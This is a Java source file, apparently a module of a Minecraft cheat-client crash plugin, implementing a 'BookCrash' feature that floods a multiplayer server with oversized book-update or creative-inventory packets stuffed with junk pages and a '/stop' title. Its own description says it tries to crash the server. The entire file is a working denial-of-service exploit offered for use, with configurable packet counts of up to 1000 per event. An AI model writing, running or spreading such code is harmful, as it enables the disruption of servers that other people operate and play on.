package me.dustin.crash.feature;

import me.dustin.crash.CrashPlugin;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.property.Property;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import me.dustin.jex.helper.player.InventoryHelper;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

import java.util.ArrayList;
import java.util.Optional;

public class BookCrash extends Feature {

    public final Property<PacketMode> packetModeProperty = new Property.PropertyBuilder<PacketMode>(this.getClass())
            .name("Packet")
            .value(PacketMode.BOOK_UPDATE)
            .build();
    public final Property<Integer> packetCountProperty = new Property.PropertyBuilder<Integer>(this.getClass())
            .name("Packet Count")
            .value(100)
            .min(1)
            .max(1000)
            .inc(5)
            .build();
    public final Property<Boolean> autoDisableProperty = new Property.PropertyBuilder<Boolean>(this.getClass())
            .name("Auto Disable")
            .value(true)
            .build();

    private final BoatPaddleStateC2SPacket PACKET = new BoatPaddleStateC2SPacket(true, true);

    public BookCrash() {
        super(CrashPlugin.CRASH, "Tries to crash the server by sending bad book sign packets.");
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        for (int i = 0; i < packetCountProperty.value(); i++)
            sendBadBook();
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.PRE));

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisableProperty.value())
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));

    private void sendBadBook() {
        String title = "/stop" + Math.random() * 400;
        String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";

        switch (packetModeProperty.value()) {
            case BOOK_UPDATE -> {
                ArrayList<String> pages = new ArrayList<>();

                for (int i = 0; i < 50; i++) {
                    StringBuilder page = new StringBuilder();
                    page.append(mm255);
                    pages.add(page.toString());
                }

                NetworkHelper.INSTANCE.sendPacket(new BookUpdateC2SPacket(InventoryHelper.INSTANCE.getInventory().selectedSlot, pages, Optional.of(title)));
            }
            case CREATIVE_ACTION -> {
                ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
                String author = "MineGame159" + Math.random() * 400;
                NbtList pageList = new NbtList();

                for (int i = 0; i < 50; ++i) {
                    pageList.addElement(i, NbtString.of(mm255));
                }

                book.getNbt().put("title", NbtString.of(title));
                book.getNbt().put("author", NbtString.of(author));
                book.getNbt().put("pages", pageList);

                NetworkHelper.INSTANCE.sendPacket(new CreativeInventoryActionC2SPacket(0, book));
            }
        }
    }

    public enum PacketMode {
        BOOK_UPDATE, CREATIVE_ACTION
    }
}
